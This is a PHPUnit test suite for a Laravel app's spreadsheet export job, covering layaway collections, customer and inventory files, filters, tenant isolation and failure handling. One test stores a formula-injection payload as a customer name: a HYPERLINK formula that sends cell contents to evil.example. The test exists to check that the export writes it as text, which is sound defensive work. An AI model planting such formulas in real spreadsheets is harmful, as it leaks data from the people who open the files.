<?php

declare(strict_types=1);

namespace Tests\Feature\Export;

use App\Domain\Collections\CollectionPreset;
use App\Domain\Export\ExportStatus;
use App\Domain\Export\ExportType;
use App\Domain\Layaway\LayawayStatus;
use App\Domain\Settings\SettingKey;
use App\Domain\Subscription\UsageMetric;
use App\Jobs\GenerateExport;
use App\Models\Catalog;
use App\Models\Category;
use App\Models\Customer;
use App\Models\ExportJob;
use App\Models\Installment;
use App\Models\Layaway;
use App\Models\Organization;
use App\Models\OrganizationSetting;
use App\Models\Plan;
use App\Models\Product;
use App\Models\Subscription;
use App\Models\UsageCounter;
use App\Models\User;
use App\Notifications\ExportFinishedNotification;
use App\Queries\CollectionFilters;
use App\Queries\CustomerDirectoryFilters;
use App\Queries\CustomerDirectoryQuery;
use Carbon\CarbonImmutable;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Storage;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\Concerns\CreatesLayaways;
use Tests\Concerns\ReusesMigratedDatabase;
use Tests\TestCase;

final class GenerateExportTest extends TestCase
{
    use CreatesLayaways, ReusesMigratedDatabase;

    private Organization $organization;

    private User $member;

    protected function setUp(): void
    {
        parent::setUp();

        CarbonImmutable::setTestNow(CarbonImmutable::parse('2026-09-10 12:00:00', 'America/Caracas'));
        Storage::fake(ExportJob::DISK);
        Notification::fake();
        $this->organization = $this->subscribe(Organization::factory()->create(['timezone' => 'America/Caracas']));
        $this->member = $this->withinOrganization($this->organization, fn (): User => User::factory()->create());
        $this->withoutOrganization();
    }

    protected function tearDown(): void
    {
        CarbonImmutable::setTestNow();

        parent::tearDown();
    }

    #[DataProvider('presets')]
    public function test_the_file_holds_exactly_what_the_screen_shows(?CollectionPreset $preset): void
    {
        $active = $this->layawayIn($this->organization, LayawayStatus::Active);
        $overdue = $this->layawayIn($this->organization, LayawayStatus::Overdue);
        $this->layawayIn($this->organization, LayawayStatus::Completed);
        $this->layawayIn($this->organization);

        foreach (['2026-08-01', '2026-08-20', '2026-09-01', '2026-09-10', '2026-09-15', '2026-09-16', '2026-09-30', '2026-10-05'] as $i => $due) {
            $this->installment($i % 2 === 0 ? $active : $overdue, $i + 1, $due);
        }

        $this->installment($active, 20, '2026-09-10', paid: 3_000);

        $listsLayaways = $preset?->listsLayaways() === true;
        $filters = new CollectionFilters($preset);
        $expected = $this->withinOrganization($this->organization, fn (): array => $listsLayaways
            ? $filters->layaways()->reorder()->orderBy('layaways.id')->get()->map(fn (Layaway $layaway): string => $layaway->code)->all()
            : $filters->installments()->with('layaway')->reorder()->orderBy('installments.id')->get()->map(fn (Installment $installment): string => $installment->layaway->code.'#'.$installment->number)->all());

        $export = $this->generate(ExportType::Collections, ['preset' => $preset->value ?? '']);
        $rows = $this->dataRows($export);

        $this->assertNotSame([], $expected);
        $this->assertSame($expected, array_map(fn (array $row): string => $listsLayaways ? (string) $row[2] : $row[2].'#'.$row[3], $rows));
        $this->assertSame(count($expected), $export->row_count);
    }

    /** @return array<string, array{0: CollectionPreset|null}> */
    public static function presets(): array
    {
        $cases = ['sin preset' => [null]];

        foreach (CollectionPreset::cases() as $preset) {
            $cases[$preset->value] = [$preset];
        }

        return $cases;
    }

    public function test_amounts_are_numbers_and_the_header_tells_the_grace_and_what_was_ignored(): void
    {
        $layaway = $this->layawayIn($this->organization, LayawayStatus::Active);
        $this->installment($layaway, 1, '2026-09-05', paid: 1_000);
        $category = $this->withinOrganization($this->organization, fn (): Category => Category::factory()->create());
        $this->withinOrganization($this->organization, fn () => OrganizationSetting::factory()->forKey(SettingKey::GracePeriodDays, 4)->create());

        $export = $this->queue(ExportType::Collections, ['category' => (string) $category->getKey()]);
        DB::table('categories')->where('id', $category->getKey())->delete();
        $this->runJob($export);

        $sheet = $this->sheet($export->refresh());
        $header = $this->headerOf($sheet);

        $this->assertSame('4', $header['Días de gracia']);
        $this->assertStringContainsString('category', $header['Filtros ignorados']);
        $this->assertSame([30.0, 10.0, 20.0, 5], array_slice($this->dataRows($export)[0], 5, 4), 'Importe, pagado, pendiente y días de atraso, como números.');
    }

    public function test_the_customers_file_has_no_account_data_and_matches_the_directory(): void
    {
        $layaway = $this->layawayIn($this->organization, LayawayStatus::Active);
        $this->installment($layaway, 1, '2026-09-20');
        $account = DB::table('accounts')->insertGetId(['display_name' => 'María G.', 'email' => 'cuenta-google@example.com', 'locale' => 'es', 'created_at' => now(), 'updated_at' => now()]);
        DB::table('customers')->where('id', $layaway->customer_id)->update(['account_id' => $account, 'email' => 'maria@example.com']);
        $this->layawayIn($this->organization, LayawayStatus::Active);

        foreach ([ExportType::Customers, ExportType::Collections] as $type) {
            $sheet = $this->sheet($this->generate($type, []));

            foreach ($this->columnsOf($sheet) as $column) {
                $this->assertStringNotContainsStringIgnoringCase('account', (string) $column);
                $this->assertStringNotContainsStringIgnoringCase('cuenta', (string) $column);
            }

            foreach ($sheet as $row) {
                $this->assertNotContains('cuenta-google@example.com', $row, 'El correo de la cuenta no sale en ninguna celda.');
                $this->assertNotContains('María G.', $row);
            }
        }

        $export = $this->withinOrganization($this->organization, fn (): ExportJob => ExportJob::query()->where('type', ExportType::Customers)->firstOrFail());

        $expected = $this->withinOrganization($this->organization, fn (): array => app(CustomerDirectoryQuery::class)->search(new CustomerDirectoryFilters)
            ->reorder()->orderBy('customers.id')->get()->map(fn (Customer $customer): string => $customer->full_name)->all());
        $this->assertSame($expected, array_map(fn (array $row): string => (string) $row[0], $this->dataRows($export)));
        $this->assertContains('maria@example.com', array_column($this->dataRows($export), 3));
    }

    public function test_the_inventory_file_applies_the_screen_filters(): void
    {
        $this->withinOrganization($this->organization, function (): void {
            Product::factory()->published()->create(['name' => 'Licuadora', 'sku' => 'LIC-1']);
            Product::factory()->create(['name' => 'Borrador', 'sku' => 'BOR-1']);
        });

        $export = $this->generate(ExportType::Inventory, ['status' => 'published']);

        $this->assertSame([['LIC-1', 'Licuadora', 'Publicado']], array_map(fn (array $row): array => array_slice($row, 0, 3), $this->dataRows($export)));
    }

    public function test_the_customers_file_applies_the_filters_and_writes_the_figures(): void
    {
        $late = $this->layawayIn($this->organization, LayawayStatus::Overdue);
        $this->installment($late, 1, '2026-08-01', paid: 1_000);
        $this->installment($this->layawayIn($this->organization, LayawayStatus::Active), 1, '2026-09-20');
        $name = $this->withinOrganization($this->organization, fn (): string => Customer::query()->whereKey($late->customer_id)->value('full_name'));

        $rows = $this->dataRows($this->generate(ExportType::Customers, ['overdue' => '1']));

        $this->assertCount(1, $rows);
        $this->assertSame($name, $rows[0][0]);
        $this->assertSame(1, $rows[0][4], 'Apartados activos.');
        $this->assertSame(1, $rows[0][8], 'Cuotas vencidas.');
        $this->assertSame('Sí', $rows[0][9]);
        $this->assertSame('2026-08-01', $rows[0][10]);
        $this->assertIsFloat($rows[0][5]);
    }

    public function test_the_inventory_columns(): void
    {
        $this->withinOrganization($this->organization, function (): void {
            $product = Product::factory()->published()->create(['sku' => 'LIC-1', 'price_cents' => 12_550, 'stock' => 7]);
            Catalog::factory()->create()->products()->attach($product->getKey(), ['position' => 1]);
        });

        $row = $this->dataRows($this->generate(ExportType::Inventory, []))[0];

        $this->assertSame(['LIC-1', 125.5, 7, 0, 0, 1], [$row[0], $row[4], $row[5], $row[6], $row[7], $row[8]]);
    }

    public function test_a_name_shaped_like_a_formula_is_written_as_text(): void
    {
        $layaway = $this->layawayIn($this->organization, LayawayStatus::Active);
        $this->installment($layaway, 1, '2026-09-20');
        $evil = '=HYPERLINK("https://evil.example/?d="&B10,"Ver comprobante")';
        DB::table('customers')->where('id', $layaway->customer_id)->update(['full_name' => $evil]);

        $export = $this->generate(ExportType::Collections, []);
        $worksheet = IOFactory::load(Storage::disk(ExportJob::DISK)->path((string) $export->file_path))->getActiveSheet();
        $found = null;

        foreach ($worksheet->getRowIterator() as $row) {
            foreach ($row->getCellIterator() as $cell) {
                if ($cell->getValue() === $evil) {
                    $found = $cell;
                }
            }
        }

        $this->assertNotNull($found, 'El nombre está en el archivo.');
        $this->assertSame(DataType::TYPE_STRING, $found->getDataType(), 'Como texto, no como fórmula.');
    }

    public function test_the_header_tells_the_applied_filters(): void
    {
        $header = $this->headerOf($this->sheet($this->generate(ExportType::Collections, ['preset' => 'due_today', 'q' => 'maría'])));

        $this->assertStringContainsString('preset: due_today', $header['Filtros']);
        $this->assertStringContainsString('q: maría', $header['Filtros']);
        $this->assertArrayHasKey('Generado el', $header);
    }

    public function test_a_failure_after_the_file_is_written_removes_it(): void
    {
        ExportJob::saving(function (ExportJob $export): void {
            if ($export->status === ExportStatus::Completed) {
                throw new \RuntimeException('falla al cerrar');
            }
        });

        $export = $this->generate(ExportType::Collections, []);

        $this->assertSame(ExportStatus::Failed, $export->status);
        $this->assertSame([], Storage::disk(ExportJob::DISK)->allFiles());
    }

    public function test_a_job_killed_by_the_queue_ends_failed_and_tells(): void
    {
        $export = $this->queue(ExportType::Collections, []);
        $this->withinOrganization($this->organization, fn () => ExportJob::query()->whereKey($export->getKey())->update(['status' => ExportStatus::Processing]));
        $this->withoutOrganization();

        (new GenerateExport((int) $export->getKey(), (int) $export->organization_id))->failed(new \RuntimeException('timeout'));

        $export = $this->withinOrganization($this->organization, fn (): ExportJob => ExportJob::query()->findOrFail($export->getKey()));
        $this->assertSame(ExportStatus::Failed, $export->status);
        $this->assertStringContainsString('se interrumpió', (string) $export->error_message);
        Notification::assertSentTo($this->member, ExportFinishedNotification::class);
    }

    public function test_zero_rows_is_a_file_with_only_its_header(): void
    {
        $export = $this->generate(ExportType::Collections, []);

        $this->assertSame(ExportStatus::Completed, $export->status);
        $this->assertSame(0, $export->row_count);
        $this->assertSame([], $this->dataRows($export));
        $this->assertContains('Cliente', $this->columnsOf($this->sheet($export)));
    }

    public function test_it_reads_by_chunk_by_id_and_only_its_organization(): void
    {
        $this->installment($this->layawayIn($this->organization, LayawayStatus::Active), 1, '2026-09-20');
        $theirs = $this->subscribe($this->neighbourOrganization());
        $this->installment($this->layawayIn($theirs, LayawayStatus::Active), 1, '2026-09-20');
        $this->withoutOrganization();

        DB::enableQueryLog();
        $export = $this->generate(ExportType::Collections, []);
        $selects = array_filter(array_column(DB::getQueryLog(), 'query'), fn (string $sql): bool => str_starts_with($sql, 'select') && str_contains($sql, 'from `installments`'));

        $this->assertNotEmpty($selects);
        $this->assertNotEmpty(array_filter($selects, fn (string $sql): bool => str_contains($sql, 'order by `installments`.`id` asc limit 500')));
        $this->assertEmpty(array_filter($selects, fn (string $sql): bool => str_contains($sql, 'offset')));
        $this->assertSame(1, $export->row_count, 'La cuota del vecino no está.');

        foreach (['customers' => ExportType::Customers, 'products' => ExportType::Inventory] as $table => $type) {
            DB::flushQueryLog();
            $this->generate($type, []);
            $selects = array_filter(array_column(DB::getQueryLog(), 'query'), fn (string $sql): bool => str_starts_with($sql, 'select') && str_contains($sql, "from `{$table}`"));
            $this->assertNotEmpty(array_filter($selects, fn (string $sql): bool => str_contains($sql, "order by `{$table}`.`id` asc limit 500")), $type->value);
            $this->assertEmpty(array_filter($selects, fn (string $sql): bool => str_contains($sql, 'offset')), $type->value);
        }
    }

    public function test_the_file_is_private_under_the_organization_counts_as_storage_and_the_requester_is_told(): void
    {
        $export = $this->generate(ExportType::Collections, []);

        $this->assertStringStartsWith($this->organization->getKey().'/', (string) $export->file_path);
        Storage::disk(ExportJob::DISK)->assertExists((string) $export->file_path);
        $this->assertEquals(CarbonImmutable::now()->addDays(7), $export->expires_at);
        $this->assertGreaterThan(0, $export->file_size);
        $this->assertSame(1, $this->storage(), 'Un archivo de unos KB son 1 MB redondeando hacia arriba.');
        Notification::assertSentTo($this->member, ExportFinishedNotification::class, fn (ExportFinishedNotification $notification): bool => $notification->status() === ExportStatus::Completed);
    }

    public function test_a_full_storage_or_a_failure_ends_in_failed_with_a_reason(): void
    {
        $this->withinOrganization($this->organization, function (): void {
            Subscription::query()->update(['plan_id' => Plan::factory()->withEveryFeature()->create(['max_storage_mb' => 1])->getKey()]);
            UsageCounter::query()->updateOrCreate(['metric' => UsageMetric::StorageMb], ['value' => 1, 'computed_at' => now()]);
        });

        $full = $this->generate(ExportType::Collections, []);

        $this->assertSame(ExportStatus::Failed, $full->status);
        $this->assertStringContainsString('almacenamiento está lleno', (string) $full->error_message);
        $this->assertSame([], Storage::disk(ExportJob::DISK)->allFiles());

        $this->withinOrganization($this->organization, fn () => UsageCounter::query()->where('metric', UsageMetric::StorageMb)->update(['value' => 0]));
        Excel::shouldReceive('store')->once()->andReturn(false);

        $broken = $this->generate(ExportType::Customers, []);

        $this->assertSame(ExportStatus::Failed, $broken->status);
        $this->assertStringContainsString('No pudimos generar el archivo', (string) $broken->error_message);
        Notification::assertSentTo($this->member, ExportFinishedNotification::class, fn (ExportFinishedNotification $notification): bool => $notification->status() === ExportStatus::Failed);
    }

    public function test_it_runs_once(): void
    {
        $export = $this->generate(ExportType::Collections, []);
        $path = $export->file_path;

        $this->runJob($export);

        $this->assertSame($path, $export->refresh()->file_path);
        $this->assertCount(1, Storage::disk(ExportJob::DISK)->allFiles());
    }

    /**
     * @param  array<string, string>  $filters
     */
    private function queue(ExportType $type, array $filters): ExportJob
    {
        return $this->withinOrganization($this->organization, fn (): ExportJob => ExportJob::factory()->create([
            'type' => $type,
            'filters' => $filters,
            'requested_by' => $this->member->getKey(),
        ]));
    }

    private function runJob(ExportJob $export): void
    {
        $this->withoutOrganization();
        app()->call([new GenerateExport((int) $export->getKey(), (int) $export->organization_id), 'handle']);
    }

    /**
     * @param  array<string, string>  $filters
     */
    private function generate(ExportType $type, array $filters): ExportJob
    {
        $export = $this->queue($type, $filters);
        $this->runJob($export);

        return $this->withinOrganization($this->organization, fn (): ExportJob => ExportJob::query()->findOrFail($export->getKey()));
    }

    /**
     * @return list<list<mixed>>
     */
    private function sheet(ExportJob $export): array
    {
        /** @var list<list<mixed>> $rows */
        $rows = IOFactory::load(Storage::disk(ExportJob::DISK)->path((string) $export->file_path))->getActiveSheet()->toArray(null, true, false, false);

        return $rows;
    }

    /**
     * @param  list<list<mixed>>  $sheet
     * @return list<mixed>
     */
    private function columnsOf(array $sheet): array
    {
        foreach ($sheet as $i => $row) {
            if ($i > 0 && array_filter($row, fn (mixed $cell): bool => $cell !== null && $cell !== '') === []) {
                return array_values(array_filter($sheet[$i + 1], fn (mixed $cell): bool => $cell !== null));
            }
        }

        $this->fail('El archivo no tiene la línea en blanco que separa la cabecera.');
    }

    /**
     * @param  list<list<mixed>>  $sheet
     * @return array<string, string>
     */
    private function headerOf(array $sheet): array
    {
        $header = [];

        foreach (array_slice($sheet, 1) as $row) {
            if ($row[0] === null || $row[0] === '') {
                break;
            }

            $header[(string) $row[0]] = (string) $row[1];
        }

        return $header;
    }

    /**
     * @return list<list<mixed>>
     */
    private function dataRows(ExportJob $export): array
    {
        $sheet = $this->sheet($export);

        foreach ($sheet as $i => $row) {
            if ($i > 0 && array_filter($row, fn (mixed $cell): bool => $cell !== null && $cell !== '') === []) {
                return array_slice($sheet, $i + 2);
            }
        }

        return [];
    }

    private function storage(): int
    {
        return (int) $this->withinOrganization($this->organization, fn (): mixed => UsageCounter::query()->where('metric', UsageMetric::StorageMb)->value('value'));
    }

    private function installment(Layaway $layaway, int $number, string $due, int $paid = 0): void
    {
        DB::table('installments')->insert([
            'organization_id' => $layaway->organization_id,
            'layaway_id' => $layaway->getKey(),
            'number' => $number,
            'due_date' => $due,
            'amount_cents' => 3_000,
            'paid_cents' => $paid,
            'status' => $paid > 0 ? 'partially_paid' : 'pending',
            'created_at' => now(),
            'updated_at' => now(),
        ]);
    }
}
